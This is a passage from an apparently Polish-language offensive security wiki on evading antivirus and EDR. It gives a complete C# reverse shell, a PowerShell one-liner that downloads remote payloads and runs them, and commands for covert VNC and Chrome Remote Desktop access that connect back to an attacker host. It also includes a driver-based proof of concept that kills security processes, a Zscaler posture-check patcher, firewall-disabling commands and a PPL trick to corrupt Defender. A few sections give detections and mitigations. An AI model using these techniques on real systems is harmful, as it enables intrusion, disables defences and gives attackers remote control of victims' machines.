Powyższy łańcuch przywraca przepływ wykonywania **bez konieczności uruchamiania złośliwego sample** – jest to przydatne podczas pracy na workstation offline.

> 🛈  ConfuserEx tworzy custom attribute o nazwie `ConfusedByAttribute`, który może służyć jako IOC do automatycznego triage’owania samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie open-source'owego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/), który zapewnia większe bezpieczeństwo software'u poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i ochronę przed modyfikacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez używania zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez framework C++ template metaprogramming, co nieco utrudni życie osobie chcącej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuscate różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie assembly code, przekształcając standardowe instrukcje w ROP chains i udaremniając nasze naturalne pojmowanie normalnego control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL do shellcode, a następnie je ładować

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, który ostrzeże użytkownika końcowego i uniemożliwi mu uruchomienie pliku (choć plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu wraz z adresem URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Należy pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem na zapobieganie nadaniu payloadom Mark of The Web jest spakowanie ich wewnątrz pewnego rodzaju kontenera, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** zostać zastosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie pakujące payloads do kontenerów wyjściowych w celu obejścia Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demonstracja bypassowania SmartScreen przez pakowanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to zaawansowany mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemu **rejestrować zdarzenia**. Może być jednak również używany przez produkty bezpieczeństwa do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku wyłączenia (bypassowania) AMSI, możliwe jest sprawienie, aby funkcja **`EtwEventWrite`** procesu user space natychmiast zwracała wynik bez rejestrowania żadnych zdarzeń. Odbywa się to przez spatchowanie funkcji w pamięci, aby natychmiast zwracała wynik, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz tutaj: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) oraz [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane od dłuższego czasu i nadal stanowi bardzo dobry sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania go na dysku, będziemy musieli martwić się jedynie o spatchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) oferuje już możliwość wykonywania C# assemblies bezpośrednio w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu poświęconego temu celowi**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu zabiciu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działania post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa**. Wadą jest **większe prawdopodobieństwo** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli podczas wykonywania payloadu coś pójdzie nie tak, istnieje **znacznie większa szansa** na **utratę beacona**, ponieważ może on ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, zapoznaj się z tym artykułem [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz również ładować C# Assemblies **z PowerShell** — sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [video S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków przez zapewnienie zaatakowanej maszynie dostępu **do środowiska interpretera zainstalowanego na Attacker Controlled SMB share**.

Udostępniając na SMB share pliki binarne interpretera oraz środowisko, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Z repozytorium wynika, że Defender nadal skanuje skrypty, ale wykorzystanie Go, Java, PHP itd. zapewnia **większą elastyczność w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## TokenStomping

Token stomping to technika pozwalająca atakującemu **manipulować tokenem dostępu lub produktem bezpieczeństwa, takim jak EDR albo AV**, zmniejszając jego uprawnienia, aby proces nie zakończył działania, ale nie miał uprawnień do sprawdzania aktywności złośliwych.

Aby temu zapobiec, Windows mógłby **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów bezpieczeństwa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia nad nim kontroli i utrzymania persistence:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij Next. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr po wprowadzeniu kilku zmian: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić PIN bez korzystania z GUI).


## Advanced Evasion

Evasion to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetry w jednym systemie, dlatego w dojrzałych środowiskach praktycznie niemożliwe jest pozostanie całkowicie niewykrytym.

Każde środowisko, przeciwko któremu działasz, będzie miało własne mocne i słabe strony.

Zdecydowanie zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać podstawowe informacje o bardziej zaawansowanych technikach Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To również świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) dotyczące Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwał fragmenty pliku binarnego**, aż **ustali, który fragment Defender** wykrywa jako złośliwy, a następnie wyodrębni go dla Ciebie.\
Innym narzędziem wykonującym **to samo zadanie jest** [**avred**](https://github.com/dobin/avred), oferujące tę usługę w otwartej wersji webowej pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do czasu Windows10 każdy system Windows zawierał **Telnet server**, który można było zainstalować (jako administrator), wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Niech uruchamia się podczas uruchamiania systemu i uruchom go teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnetu** (stealth) **i wyłącz firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz go z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebujesz plików bin, a nie instalatora)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **komputer ofiary**

#### **Połączenie zwrotne**

**Atakujący** powinien **uruchomić wewnątrz** swojego **hosta** plik binarny `vncviewer.exe -listen 5900`, aby był **przygotowany** na odebranie zwrotnego **połączenia VNC**. Następnie, na **komputerze ofiary**: uruchom demona winvnc poleceniem `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować stealth, nie wolno wykonywać kilku czynności

- Nie uruchamiaj `winvnc`, jeśli już działa, ponieważ wywołasz [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, ponieważ spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby uzyskać pomoc, ponieważ wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz go z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
W GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# przy użyciu kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia python do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator** do wyłączenia zabezpieczeń endpointów przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* driver** i nadużywa go do wykonywania uprzywilejowanych operacji w kernelu, których nie mogą zablokować nawet usługi AV działające jako Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze informacje:
1. **Signed driver**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale binarnie jest to legalnie podpisany driver `AToolsKrnl64.sys` pochodzący z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ driver posiada prawidłowy podpis Microsoftu, ładuje się nawet wtedy, gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje driver jako **kernel service**, a druga uruchamia go, dzięki czemu `\\.\ServiceMouse` staje się dostępne z user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu według PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunięcie dowolnego pliku z dysku |
| `0x990001D0` | Wyładowanie drivera i usunięcie service |

Minimalny C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD całkowicie omija zabezpieczenia user-mode; kod wykonywany w kernelu może otwierać *chronione* procesy, kończyć ich działanie lub modyfikować obiekty kernela niezależnie od PPL/PP, ELAM i innych funkcji hardeningu.

Detection / Mitigation
•  Włącz listę blokowanych podatnych driverów Microsoftu (`HVCI`, `Smart App Control`), aby Windows odmówił załadowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych *kernel* services i generuj alerty, gdy driver jest ładowany z katalogu zapisywalnego dla wszystkich użytkowników lub nie znajduje się na allow-list.
•  Obserwuj handlery user-mode do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

**Client Connector** firmy Zscaler lokalnie stosuje reguły device-posture i korzysta z Windows RPC do przekazywania wyników innym komponentom. Dwie słabe decyzje projektowe umożliwiają pełny bypass:

1. Ocena posture odbywa się **całkowicie po stronie klienta** (do servera wysyłana jest wartość boolean).
2. Wewnętrzne endpointy RPC sprawdzają wyłącznie, czy łączący się executable jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Przez **patching czterech podpisanych binary na dysku** można zneutralizować oba mechanizmy:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się wynikiem compliant |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione przez NOP ⇒ dowolny proces, nawet unsigned, może połączyć się z RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks tunelu | Pomijane |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu service stack:

* **Wszystkie** posture checks wyświetlają status **green/compliant**.
* Niepodpisane lub zmodyfikowane binaries mogą otwierać named-pipe RPC endpoints (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zaatakowany host uzyskuje nieograniczony dostęp do internal network zdefiniowanej przez policies Zscaler.

To case study pokazuje, jak decyzje zaufania podejmowane wyłącznie po stronie klienta oraz proste sprawdzanie podpisów mogą zostać pokonane za pomocą kilku byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level, dzięki czemu tylko protected processes o równym lub wyższym poziomie mogą wzajemnie dokonywać modyfikacji. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić binary z włączonym PPL i kontrolować jego arguments, możesz przekształcić benign functionality (np. logging) w ograniczony, wspierany przez PPL write primitive wymierzony w protected directories używane przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że process działa jako PPL
- Target EXE (oraz wszystkie załadowane DLLs) musi być podpisany za pomocą PPL-capable EKU.
- Process musi zostać utworzony za pomocą CreateProcess z użyciem flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać kompatybilnego protection level, który odpowiada signerowi binary (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla anti-malware signers, `PROTECTION_LEVEL_WINDOWS` dla Windows signers). Nieprawidłowe levels spowodują niepowodzenie podczas tworzenia.

Zobacz także szersze wprowadzenie do PP/PPL oraz LSASS protection tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (wybiera protection level i przekazuje arguments do target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany systemowy binary `C:\Windows\System32\ClipUp.exe` uruchamia się samodzielnie i przyjmuje parametr umożliwiający zapisanie pliku logu w ścieżce określonej przez wywołującego.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z użyciem mechanizmu PPL.
- ClipUp nie potrafi analizować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

Pomocnicze polecenia dla krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Uzyskaj krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (abstrakcyjny)
1) Uruchom zdolny do działania jako PPL LOLBIN (ClipUp) z `CREATE_PROTECTED_PROCESS`, używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli docelowy binary jest normalnie otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę auto-start, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu systemu zapis wspierany przez PPL następuje przed zablokowaniem binary przez AV, uszkadzając docelowy plik i uniemożliwiając jego uruchomienie.

Przykładowe wywołanie (ścieżki usunięte/skrócone ze względów bezpieczeństwa):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować zawartości zapisywanej przez ClipUp, a jedynie jej lokalizację; primitive nadaje się do corruption, a nie do precyzyjnego wstrzykiwania zawartości.
- Wymaga lokalnych uprawnień administratora/SYSTEM do zainstalowania/uruchomienia service oraz okna czasowego na reboot.
- Timing ma kluczowe znaczenie: target nie może być otwarty; wykonanie podczas bootu pozwala uniknąć file locks.

Detekcje
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie gdy jego parentem są niestandardowe launchery, w okolicach bootu.
- Nowe services skonfigurowane do auto-startu podejrzanych plików binarnych i konsekwentnie uruchamiane przed Defenderem/AV. Zbadaj tworzenie/modyfikację service przed wystąpieniem błędów uruchamiania Defendera.
- File integrity monitoring plików binarnych Defendera/katalogów Platform; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z protected-process flags.
- Telemetria ETW/EDR: szukaj procesów tworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomu PPL przez pliki binarne inne niż AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i pod kontrolą których parentów; blokuj wywołania ClipUp poza uzasadnionymi kontekstami.
- Service hygiene: ograniczaj tworzenie/modyfikowanie services uruchamianych automatycznie i monitoruj manipulowanie kolejnością uruchamiania.
- Upewnij się, że tamper protection Defendera i early-launch protections są włączone; badaj błędy uruchamiania wskazujące na corruption plików binarnych.
